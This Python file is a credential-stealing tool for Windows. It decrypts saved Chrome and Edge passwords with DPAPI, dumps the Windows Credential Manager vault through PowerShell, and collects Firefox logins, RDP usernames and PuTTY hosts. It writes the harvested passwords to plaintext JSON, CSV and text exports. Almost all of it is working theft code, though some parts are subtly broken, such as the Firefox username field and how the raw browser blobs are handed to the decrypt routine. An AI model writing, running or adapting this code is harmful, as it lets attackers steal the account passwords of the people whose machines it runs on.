"""
Credential Harvesting Module using DPAPI (Data Protection API)
Harvests and manages credentials using Windows DPAPI encryption
"""

import os
import json
import struct
import base64
from pathlib import Path
from typing import Optional, Dict, List, Tuple
import subprocess
import re


class DPAPICredentialHarvester:
    """
    Harvests credentials from various Windows sources and encrypts them using DPAPI.
    DPAPI provides per-user or per-machine encryption for credential storage.
    """

    def __init__(self, machine_scope: bool = False):
        """
        Initialize the credential harvester.

        Args:
            machine_scope: If True, use machine-wide DPAPI scope;
                          if False, use current user scope (default)
        """
        self.machine_scope = machine_scope
        self.scope = "MACHINE" if machine_scope else "CURRENT_USER"
        self.harvested_credentials = {}
        self.encrypted_storage = Path.home() / ".credential_cache"
        self.encrypted_storage.mkdir(exist_ok=True)

    def harvest_browser_credentials(self) -> Dict[str, List[Dict]]:
        """
        Harvest credentials from major browsers (Chrome, Edge, Firefox)
        Returns dict with browser names as keys and credential lists as values
        """
        credentials = {}

        # Chrome credential harvesting
        chrome_creds = self._harvest_chrome_credentials()
        if chrome_creds:
            credentials['chrome'] = chrome_creds

        # Edge credential harvesting
        edge_creds = self._harvest_edge_credentials()
        if edge_creds:
            credentials['edge'] = edge_creds

        # Firefox credential harvesting
        firefox_creds = self._harvest_firefox_credentials()
        if firefox_creds:
            credentials['firefox'] = firefox_creds

        return credentials

    def _harvest_chrome_credentials(self) -> List[Dict]:
        """
        Harvest credentials from Chrome browser profile
        Chrome stores credentials in encrypted database
        """
        creds = []
        chrome_path = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data"

        if not chrome_path.exists():
            return creds

        try:
            # Chrome credential database path
            login_db = chrome_path / "Default" / "Login Data"
            if login_db.exists():
                # Query Chrome's Login Data SQLite database
                query = "SELECT origin_url, username_value, password_value FROM logins"
                result = self._query_sqlite_db(str(login_db), query)

                for row in result:
                    origin_url, username, encrypted_password = row
                    # Decrypt using DPAPI
                    try:
                        decrypted_password = self.dpapi_decrypt(encrypted_password)
                        creds.append({
                            'url': origin_url,
                            'username': username,
                            'password': decrypted_password,
                            'source': 'chrome'
                        })
                    except Exception as e:
                        creds.append({
                            'url': origin_url,
                            'username': username,
                            'password': f'[FAILED_TO_DECRYPT: {str(e)}]',
                            'source': 'chrome'
                        })
        except Exception as e:
            print(f"[!] Error harvesting Chrome credentials: {e}")

        return creds

    def _harvest_edge_credentials(self) -> List[Dict]:
        """
        Harvest credentials from Microsoft Edge browser
        Edge stores credentials similarly to Chrome in LocalState
        """
        creds = []
        edge_path = Path.home() / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data"

        if not edge_path.exists():
            return creds

        try:
            login_db = edge_path / "Default" / "Login Data"
            if login_db.exists():
                query = "SELECT origin_url, username_value, password_value FROM logins"
                result = self._query_sqlite_db(str(login_db), query)

                for row in result:
                    origin_url, username, encrypted_password = row
                    try:
                        decrypted_password = self.dpapi_decrypt(encrypted_password)
                        creds.append({
                            'url': origin_url,
                            'username': username,
                            'password': decrypted_password,
                            'source': 'edge'
                        })
                    except Exception as e:
                        creds.append({
                            'url': origin_url,
                            'username': username,
                            'password': f'[FAILED_TO_DECRYPT: {str(e)}]',
                            'source': 'edge'
                        })
        except Exception as e:
            print(f"[!] Error harvesting Edge credentials: {e}")

        return creds

    def _harvest_firefox_credentials(self) -> List[Dict]:
        """
        Harvest credentials from Firefox browser
        Firefox stores credentials in JSON format in profile directory
        """
        creds = []
        firefox_path = Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"

        if not firefox_path.exists():
            return creds

        try:
            # Search through Firefox profiles
            for profile_dir in firefox_path.glob("*.default*"):
                logins_json = profile_dir / "logins.json"
                if logins_json.exists():
                    try:
                        with open(logins_json, 'r') as f:
                            logins_data = json.load(f)

                        for login in logins_data.get('logins', []):
                            # Firefox stores encrypted password
                            creds.append({
                                'url': login.get('hostname', ''),
                                'username': login.get('usernameField', ''),
                                'password': f'[ENCRYPTED: {login.get("encryptedPassword", "")}]',
                                'source': 'firefox'
                            })
                    except Exception as e:
                        print(f"[!] Error parsing Firefox logins: {e}")
        except Exception as e:
            print(f"[!] Error harvesting Firefox credentials: {e}")

        return creds

    def harvest_windows_credentials(self) -> Dict[str, any]:
        """
        Harvest Windows Credential Manager stored credentials
        Uses Windows Credential Manager API
        """
        creds = {}

        try:
            # Use PowerShell to retrieve credentials from Windows Credential Manager
            ps_cmd = """
            [System.Reflection.Assembly]::LoadAssemblyFromName('System.Security')
            $credentialSet = New-Object Windows.Security.Credentials.PasswordVault
            $credentials = $credentialSet.RetrieveAll()
            foreach ($credential in $credentials) {
                $credential.RetrievePassword()
                Write-Output "$($credential.Resource)|$($credential.UserName)|$($credential.Password)"
            }
            """

            result = subprocess.run(
                ["powershell", "-Command", ps_cmd],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) == 3:
                            creds[parts[0]] = {
                                'username': parts[1],
                                'password': parts[2],
                                'source': 'windows_credential_manager'
                            }
        except Exception as e:
            print(f"[!] Error harvesting Windows Credential Manager: {e}")

        return creds

    def harvest_rdp_credentials(self) -> Dict[str, Dict]:
        """
        Harvest RDP (Remote Desktop Protocol) cached credentials
        Reads from registry and RDP connection history
        """
        creds = {}

        try:
            # Access RDP credential cache from registry
            import winreg

            reg_path = r"Software\Microsoft\Terminal Server Client\Servers"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKeyEx(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        user_name = winreg.QueryValueEx(subkey, 'UsernameHint')[0]
                        creds[subkey_name] = {
                            'username': user_name,
                            'source': 'rdp_cache'
                        }
                    except:
                        pass
                    finally:
                        winreg.CloseKey(subkey)
                winreg.CloseKey(key)
            except FileNotFoundError:
                pass
        except Exception as e:
            print(f"[!] Error harvesting RDP credentials: {e}")

        return creds

    def harvest_application_credentials(self, app_name: str = None) -> Dict[str, List[Dict]]:
        """
        Harvest credentials from common applications
        Searches AppData for configuration files with credentials
        """
        creds = {}

        # Common application locations with credential storage
        app_locations = {
            'putty': Path.home() / "AppData" / "Roaming" / "PuTTY" / "sessions",
            'winscp': Path.home() / "AppData" / "Roaming" / "WinSCP.ini",
            'filezilla': Path.home() / "AppData" / "Roaming" / "FileZilla" / "sitemanager.xml",
            'tortoise_svn': Path.home() / "AppData" / "Roaming" / "TortoiseSVN" / "auth",
        }

        for app, path in app_locations.items():
            if app_name and app != app_name:
                continue

            if path.exists():
                try:
                    app_creds = self._extract_app_credentials(app, path)
                    if app_creds:
                        creds[app] = app_creds
                except Exception as e:
                    print(f"[!] Error harvesting {app} credentials: {e}")

        return creds

    def _extract_app_credentials(self, app_name: str, app_path: Path) -> List[Dict]:
        """
        Extract credentials from application-specific storage
        """
        creds = []

        if app_name == 'putty' and app_path.is_dir():
            # PuTTY stores sessions in registry, but we can check config files
            for session_file in app_path.glob("*"):
                if session_file.is_file():
                    try:
                        with open(session_file, 'r', errors='ignore') as f:
                            content = f.read()
                            # Extract hostname if present
                            hostname_match = re.search(r'HostName=(.*)', content)
                            username_match = re.search(r'UserName=(.*)', content)
                            if hostname_match:
                                creds.append({
                                    'host': hostname_match.group(1),
                                    'username': username_match.group(1) if username_match else '',
                                    'session': session_file.name
                                })
                    except Exception:
                        pass

        return creds

    def dpapi_encrypt(self, data: str) -> str:
        """
        Encrypt data using Windows DPAPI
        Returns base64-encoded encrypted data
        """
        try:
            ps_cmd = f"""
            $text = "{data.replace('"', '`"')}"
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
            $scope = [System.Security.Cryptography.DataProtectionScope]::{self.scope}
            $encrypted = [System.Security.Cryptography.ProtectedData]::Protect($bytes, $null, $scope)
            [Convert]::ToBase64String($encrypted)
            """

            result = subprocess.run(
                ["powershell", "-Command", ps_cmd],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                return result.stdout.strip()
            else:
                raise Exception(f"DPAPI encryption failed: {result.stderr}")
        except Exception as e:
            print(f"[!] DPAPI encryption error: {e}")
            return None

    def dpapi_decrypt(self, encrypted_data: str) -> str:
        """
        Decrypt data using Windows DPAPI
        Expects base64-encoded encrypted data
        """
        try:
            ps_cmd = f"""
            $encrypted = [Convert]::FromBase64String("{encrypted_data}")
            $scope = [System.Security.Cryptography.DataProtectionScope]::{self.scope}
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, $scope)
            [System.Text.Encoding]::UTF8.GetString($decrypted)
            """

            result = subprocess.run(
                ["powershell", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                return result.stdout.strip()
            else:
                raise Exception(f"DPAPI decryption failed: {result.stderr}")
        except Exception as e:
            print(f"[!] DPAPI decryption error: {e}")
            return None

    def _query_sqlite_db(self, db_path: str, query: str) -> List[Tuple]:
        """
        Query SQLite database (used by Chrome/Edge for credential storage)
        """
        try:
            import sqlite3

            # Make a temporary copy to avoid database locks
            import tempfile
            import shutil

            temp_db = Path(tempfile.gettempdir()) / "temp_db.sqlite"
            shutil.copy2(db_path, temp_db)

            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute(query)
            results = cursor.fetchall()
            conn.close()

            temp_db.unlink()
            return results
        except Exception as e:
            print(f"[!] SQLite query error: {e}")
            return []

    def store_credentials_encrypted(self, credentials: Dict) -> bool:
        """
        Store harvested credentials encrypted using DPAPI
        Saves to encrypted storage location
        """
        try:
            # Serialize credentials
            creds_json = json.dumps(credentials, indent=2)

            # Encrypt using DPAPI
            encrypted = self.dpapi_encrypt(creds_json)

            if encrypted:
                # Save to encrypted storage
                storage_file = self.encrypted_storage / "harvested_creds.enc"
                with open(storage_file, 'w') as f:
                    f.write(encrypted)

                print(f"[+] Credentials stored encrypted at: {storage_file}")
                return True
            else:
                print("[-] Failed to encrypt credentials")
                return False
        except Exception as e:
            print(f"[!] Error storing credentials: {e}")
            return False

    def retrieve_credentials_encrypted(self) -> Optional[Dict]:
        """
        Retrieve and decrypt stored credentials
        """
        try:
            storage_file = self.encrypted_storage / "harvested_creds.enc"

            if not storage_file.exists():
                print("[-] No encrypted credentials found")
                return None

            with open(storage_file, 'r') as f:
                encrypted_data = f.read()

            # Decrypt using DPAPI
            decrypted_json = self.dpapi_decrypt(encrypted_data)

            if decrypted_json:
                return json.loads(decrypted_json)
            else:
                print("[-] Failed to decrypt credentials")
                return None
        except Exception as e:
            print(f"[!] Error retrieving credentials: {e}")
            return None

    def harvest_all(self) -> Dict:
        """
        Perform comprehensive credential harvesting from all available sources
        """
        print("[*] Starting comprehensive credential harvesting...")

        all_credentials = {
            'timestamp': str(__import__('datetime').datetime.now()),
            'browser_credentials': self.harvest_browser_credentials(),
            'windows_credentials': self.harvest_windows_credentials(),
            'rdp_credentials': self.harvest_rdp_credentials(),
            'application_credentials': self.harvest_application_credentials(),
        }

        self.harvested_credentials = all_credentials
        print(f"[+] Credential harvesting completed")

        return all_credentials

    def export_credentials(self, output_format: str = 'json', filepath: str = None) -> str:
        """
        Export harvested credentials in specified format

        Args:
            output_format: 'json', 'csv', or 'txt'
            filepath: Optional file path to save export

        Returns:
            Formatted credential data as string
        """
        if not self.harvested_credentials:
            return "No credentials harvested yet"

        if output_format == 'json':
            output = json.dumps(self.harvested_credentials, indent=2)
        elif output_format == 'csv':
            output = self._format_as_csv()
        elif output_format == 'txt':
            output = self._format_as_text()
        else:
            output = str(self.harvested_credentials)

        if filepath:
            with open(filepath, 'w') as f:
                f.write(output)
            print(f"[+] Credentials exported to: {filepath}")

        return output

    def _format_as_csv(self) -> str:
        """Format harvested credentials as CSV"""
        import csv
        from io import StringIO

        output = StringIO()
        writer = csv.writer(output)
        writer.writerow(['Source', 'URL/Host', 'Username', 'Password', 'Type'])

        # Write browser credentials
        for browser, creds in self.harvested_credentials.get('browser_credentials', {}).items():
            for cred in creds:
                writer.writerow([
                    browser,
                    cred.get('url', ''),
                    cred.get('username', ''),
                    cred.get('password', ''),
                    'browser'
                ])

        # Write Windows credentials
        for host, cred in self.harvested_credentials.get('windows_credentials', {}).items():
            writer.writerow([
                'windows_credential_manager',
                host,
                cred.get('username', ''),
                cred.get('password', ''),
                'windows'
            ])

        # Write RDP credentials
        for host, cred in self.harvested_credentials.get('rdp_credentials', {}).items():
            writer.writerow([
                'rdp',
                host,
                cred.get('username', ''),
                '',
                'rdp'
            ])

        return output.getvalue()

    def _format_as_text(self) -> str:
        """Format harvested credentials as readable text"""
        lines = []
        lines.append("=" * 80)
        lines.append("CREDENTIAL HARVEST REPORT")
        lines.append(f"Timestamp: {self.harvested_credentials.get('timestamp', 'N/A')}")
        lines.append("=" * 80)

        # Browser credentials
        browser_creds = self.harvested_credentials.get('browser_credentials', {})
        if browser_creds:
            lines.append("\n[BROWSER CREDENTIALS]")
            for browser, creds in browser_creds.items():
                lines.append(f"\n  {browser.upper()}:")
                for cred in creds:
                    lines.append(f"    URL: {cred.get('url', 'N/A')}")
                    lines.append(f"    Username: {cred.get('username', 'N/A')}")
                    lines.append(f"    Password: {cred.get('password', 'N/A')}")
                    lines.append("")

        # Windows credentials
        win_creds = self.harvested_credentials.get('windows_credentials', {})
        if win_creds:
            lines.append("\n[WINDOWS CREDENTIAL MANAGER]")
            for host, cred in win_creds.items():
                lines.append(f"  Host: {host}")
                lines.append(f"  Username: {cred.get('username', 'N/A')}")
                lines.append(f"  Password: {cred.get('password', 'N/A')}")
                lines.append("")

        # RDP credentials
        rdp_creds = self.harvested_credentials.get('rdp_credentials', {})
        if rdp_creds:
            lines.append("\n[RDP CREDENTIALS]")
            for host, cred in rdp_creds.items():
                lines.append(f"  Host: {host}")
                lines.append(f"  Username: {cred.get('username', 'N/A')}")
                lines.append("")

        lines.append("=" * 80)
        return '\n'.join(lines)


def main():
    """
    Demonstration of the credential harvester
    """
    print("[*] DPAPI Credential Harvester Module")
    print("[*] ====================================\n")

    # Initialize harvester with user scope
    harvester = DPAPICredentialHarvester(machine_scope=False)

    # Perform comprehensive credential harvesting
    credentials = harvester.harvest_all()

    # Store credentials encrypted
    harvester.store_credentials_encrypted(credentials)

    # Export in different formats
    print("\n[*] Exporting credentials...")
    print(harvester.export_credentials(output_format='txt'))

    # Export to file
    harvester.export_credentials(output_format='json', filepath='credentials_export.json')
    harvester.export_credentials(output_format='csv', filepath='credentials_export.csv')

    # Retrieve encrypted credentials
    print("\n[*] Retrieving encrypted credentials...")
    retrieved = harvester.retrieve_credentials_encrypted()
    if retrieved:
        print("[+] Successfully retrieved encrypted credentials")


if __name__ == '__main__':
    main()
